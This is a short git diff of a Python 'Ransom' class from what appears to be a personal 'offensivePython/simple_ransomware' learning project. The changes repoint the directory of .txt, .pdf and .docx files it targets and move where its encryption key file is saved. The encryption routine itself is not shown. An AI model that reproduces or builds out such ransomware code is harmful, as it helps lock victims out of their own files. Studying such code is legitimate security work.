@@ -5,7 +5,7 @@ from pathlib import Path
 class Ransom:
     def __init__(self):
         self._key = ''
-        self._dir = Path(r'C:\Users\Fernando\Documents\igti\pwned')
+        self._dir = Path(r'C:\Users\Fernando\Documents\offensivePython\simple_ransomware\pwned')
         self._ext = ('.txt', '.pdf', '.docx')
 
     def genKey(self):
@@ -21,7 +21,8 @@ class Ransom:
         return self._key
 
     def save_key(self):
-        file = open('key.txt', 'w')
+        key_path = Path(r'C:\Users\Fernando\Documents\offensivePython\simple_ransomware')
+        file = open(f'{key_path}/key.txt', 'w')
         file.write(self._key)
 
     def crypto(self):
